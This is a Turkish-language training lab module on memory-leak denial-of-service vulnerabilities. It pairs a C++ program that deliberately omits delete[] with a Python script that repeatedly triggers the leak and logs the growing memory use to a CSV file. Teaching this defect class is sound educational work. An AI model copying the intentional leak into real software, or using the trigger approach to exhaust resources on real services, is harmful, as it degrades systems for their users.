# CyberLabs: Memory Leak (Bellek Sızıntısı) Zafiyeti Laboratuvarı

**Modül Kodu:** CL-MEM-003

**Seviye:** Orta

**Konu:** Kaynak Tüketimi Zafiyetleri (Resource Exhaustion)

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, sık karşılaşılan kaynak tüketimi zafiyetlerinden biri olan **Memory Leak (Bellek Sızıntısı)** konusunu ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

  - Memory Leak zafiyetinin temel nedenlerini ve Denial of Service (DoS) etkisini anlamak.
  - C++'ta dinamik bellek yönetiminde `new` ve `delete` eşleşmesinin kritik önemini kavramak.
  - `g++` ile C++ programı derlemek.
  - Python ile zafiyeti tetikleyen ve etkilerini kaydeden bir betik yazmak.
  - Linux sistem araçları (`ps`, `watch`) ile bir sürecin bellek kullanımını canlı olarak izleyerek zafiyetin etkisini kanıtlamak.

## Senaryo

Laboratuvar senaryosu, iki ana bileşenden oluşmaktadır:

1.  `leaky_server.cpp`: İçerisinde kasıtlı olarak bir Memory Leak zafiyeti barındıran, C++ ile yazılmış hedef uygulama.
2.  `trigger_and_log_leak.py`: Zafiyetli uygulamaya sürekli istek göndererek bellek sızıntısını tetikleyen ve programın artan bellek kullanımını bir dosyaya kaydeden Python betiği.

## Kurulum ve Çalıştırma Adımları

### Disclaimer / Yasal Uyarı

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının ve yazılımcıların savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır. Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir.

### Memory Leak Zafiyeti Nedir?

Bellek Sızıntısı (Memory Leak), bir programın `new` veya `malloc` gibi komutlarla dinamik olarak ayırdığı bellek alanlarını, işi bittikten sonra `delete` veya `free()` ile sisteme geri iade etmeyi unutması sonucu ortaya çıkan bir kaynak tüketimi zafiyetidir. Bu durumda, ayrılan belleğe işaret eden pointer kaybolur, ancak bellek işletim sistemi tarafından hala o programa tahsis edilmiş olarak görünür. Bu sızıntı sürekli tekrarlandığında, programın bellek kullanımı zamanla durmaksızın artar, bu da sistem kaynaklarını tüketerek programın ve nihayetinde tüm sistemin yavaşlamasına, kararsızlaşmasına veya çökmesine neden olur. Bu nedenle, kontrolü ele geçirmeye izin vermese de, ciddi bir **Hizmet Reddi (Denial of Service)** güvenlik açığı olarak kabul edilir.

### Örnek Kod İncelemesi

Öncelikle zafiyetli programımızı yazalım. Bu program, dışarıdan gelen her sinyalde bir miktar bellek ayıracak ama asla serbest bırakmayacaktır.

```cpp
#include <iostream>
#include <cstdlib> // Gerekli değilse de standart olarak eklenir
#include <unistd.h> // getpid() fonksiyonu için (Linux/macOS)

/**
 * @brief Her çağrıldığında 10 byte'lık bellek sızdırır.
 */
void vulnerable_func() {
    // C++'ın 'new[]' operatörü ile heap üzerinde 10 byte'lık yer ayır.
    char* ptr = new char[10];
    
    // Ayrılan belleğe bir işlem yapılıyormuş gibi göstermek için.
    if (ptr != nullptr) {
        ptr[0] = 'L';
    }

    // HATA: 'new[]' ile ayrılan bu belleğin 'delete[] ptr;' ile
    // serbest bırakılması gerekirdi. Bu satırın olmaması zafiyete neden olur.
}

/**
 * @brief Ana program döngüsü.
 */
int main() {
    // std::cerr kullanarak hata/bilgi akışına yazdırıyoruz.
    std::cerr << "[KURBAN] C++ Bellek Sızdırma Programı Başladı." << std::endl;
    std::cerr << "Saldırgan betikten sinyal bekleniyor..." << std::endl;
    
    // Python'dan sürekli karakter/sinyal bekle.
    // Akış sonlanana kadar (EOF) döngü devam eder.
    while (std::cin.get() != EOF) {
        vulnerable_func();
    }

    return 0;
}
```

Zafiyetin temel mantığı basittir: `vulnerable_func()` fonksiyonu içindeki `new char[10]` çağrısı, her seferinde yeni bir bellek alanı tahsis eder. Ancak bu alanın adresini tutan `ptr` değişkeni, fonksiyon bittiğinde kapsam dışı kalarak yok olur. Bellek alanı ise serbest bırakılmadığı için "sahipsiz" bir şekilde program tarafından işgal edilmeye devam eder.

Artık kodu derleyebiliriz. Bu zafiyet türü için `-no-pie` gibi özel bayraklara ihtiyaç yoktur.

```bash
g++ -o leaky_server leaky_server.cpp
```

-----

### Zafiyetin Tespiti ve Etkisinin Gözlemlenmesi

Bu zafiyeti sömürmek, programın akışını değiştirmek değil, **kaynaklarını tüketmektir**. Bunu yapmak ve kanıtlamak için, bir yandan sızıntıyı sürekli tetiklerken, diğer yandan sistem araçlarıyla programın artan bellek kullanımını izleyeceğiz.

1.  **Saldırgan Betiği Başlatılır:** `trigger_and_log_leak.py` betiği, `leaky_server` programını başlatır ve PID'sini tespit eder.
2.  **Sızıntı Tetiklenir:** Betik, `leaky_server`'ın `stdin`'ine sürekli olarak `\n` (Enter) karakteri gönderir. Her `\n` karakteri, `cin.get()` fonksiyonunu tetikler ve `vulnerable_func()`'nin bir kez daha çalışmasına neden olur.
3.  **Bellek İzlenir:** Bu sırada, ikinci bir terminalde `watch` ve `ps` komutları kullanılarak `leaky_server`'ın **RSS (Resident Set Size - Fiziksel Bellek Kullanımı)** değeri canlı olarak izlenir.

Aşağıdaki resimde, soldaki terminalde sızıntıyı tetikleyen Python betiği, sağdaki terminalde ise `watch` komutu ile `leaky_server`'ın anbean artan bellek kullanımı (RSS) görülmektedir.

\<img width="951" alt="resim" src="[https://github.com/user-attachments/assets/75211910-6394-4632-8e10-38e23293e506](https://www.google.com/search?q=https://github.com/user-attachments/assets/75211910-6394-4632-8e10-38e23293e506)" /\>

*Bellek Kullanımının Canlı İzlenmesi*

### Sömürü ve Raporlama Kodunun Tam Hali

Bu Python betiği, sızıntıyı tetiklerken aynı zamanda bellek artışını saniye saniye bir CSV dosyasına kaydederek saldırının kanıtını oluşturur.

```python
import subprocess
import time
import sys
import psutil
import csv
import datetime

# Gereksinim: pip install psutil

VICTIM_PROGRAM = "./leaky_server"
LOG_FILE = "memory_leak_log.csv"

def main():
    print("--- [SALDIRGAN] Bellek Sızıntısını Tetikleyici ve Kaydedici Başlatıldı ---")
    p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    victim_pid = p.pid
    print(f"[*] '{VICTIM_PROGRAM}' başlatıldı. PID: {victim_pid}")
    
    try:
        victim_process = psutil.Process(victim_pid)
    except psutil.NoSuchProcess:
        print(f"[!] HATA: PID {victim_pid} ile bir süreç bulunamadı.")
        sys.exit(1)
        
    print(f"[*] Bellek kullanımı '{LOG_FILE}' dosyasına kaydedilecek.")
    
    with open(LOG_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Zaman (saniye)', 'Bellek Kullanimi (KB)'])

    start_time = time.time()
    print("[*] Sızıntı tetikleniyor ve kaydediliyor... (Durdurmak için CTRL+C)")
    
    try:
        while True:
            p.stdin.write(b'\n')
            p.stdin.flush()
            
            elapsed_time = time.time() - start_time
            memory_kb = victim_process.memory_info().rss / 1024
            
            with open(LOG_FILE, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow([f"{elapsed_time:.2f}", f"{memory_kb:.2f}"])
            
            print(f"\r[*] Gecen Sure: {elapsed_time:.0f}s, Anlık Bellek: {memory_kb:.2f} KB", end="")
            time.sleep(0.1)
            
    except (KeyboardInterrupt, psutil.NoSuchProcess):
        print("\n\n[*] İzleme durduruldu.")
        if p.poll() is None: p.terminate()
    
    print(f"--- Analiz Tamamlandı. Veriler '{LOG_FILE}' dosyasında. ---")

if __name__ == "__main__":
    main()
```

Betiği çalıştırıp durdurduktan sonra oluşan `memory_leak_log.csv` dosyasını bir hesap tablosu programı ile açarak bellek artışını gösteren aşağıdaki gibi bir grafik elde edebilirsiniz. Bu grafik, zafiyetin etkisini raporlamak için en güçlü kanıttır.

\<img width="576" alt="resim" src="[https://github.com/user-attachments/assets/c50c184c-35cd-4f16-8f9f-02758efcdd26](https://www.google.com/search?q=https://github.com/user-attachments/assets/c50c184c-35cd-4f16-8f9f-02758efcdd26)" /\>

*Bellek Artış Grafiği*

Okuduğunuz için teşekkür ederim\!